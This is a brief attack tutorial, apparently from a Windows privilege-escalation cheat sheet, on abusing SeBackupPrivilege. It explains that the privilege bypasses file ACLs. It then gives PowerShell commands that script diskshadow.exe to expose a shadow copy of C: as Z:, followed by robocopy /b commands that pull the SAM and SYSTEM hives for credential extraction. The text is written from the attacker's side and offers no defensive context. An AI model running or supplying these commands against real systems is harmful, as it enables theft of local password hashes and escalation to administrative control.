
## 1. SeBackUp privilege:

SeBackupPrivilege allows file content retrieval, even if the security descriptor on the file might not grant such access. A caller with SeBackupPrivilege enabled eliminates the need for any ACL-based security check.

The takeaway is that with SeBackupPrivilege enabled, the attacker can backup the entire drive, which includes files that the user with the permission does not have permissions on. From there, the attacker can access any of the files from the backup volume they create.

we will extract a copy of the SAM file  by creating a shadow copy of C: using diskshadow.exe. After creating a shadow copy of C:, we can interact with it and access any file from the file system. Since this is a copy of C:, we can directly access the SAM and SYSTEM files.

```powershell
echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii

echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append

echo "create" | out-file ./diskshadow.txt -encoding ascii -append

echo "expose temp z:" | out-file ./diskshadow.txt -encoding ascii -append

diskshadow.exe /s c:\temp\diskshadow.txt
```

Now that the shadow copy has been successfully created and exposed as Z:, we can use the following **robocopy** commands to extract a copy of the SYSTEM and SAM files from Z:\windows\system32\config:


```powershell
robocopy /b Z:\Windows\System32\Config C:\temp SAM

robocopy /b Z:\Windows\System32\Config C:\temp SYSTEM
```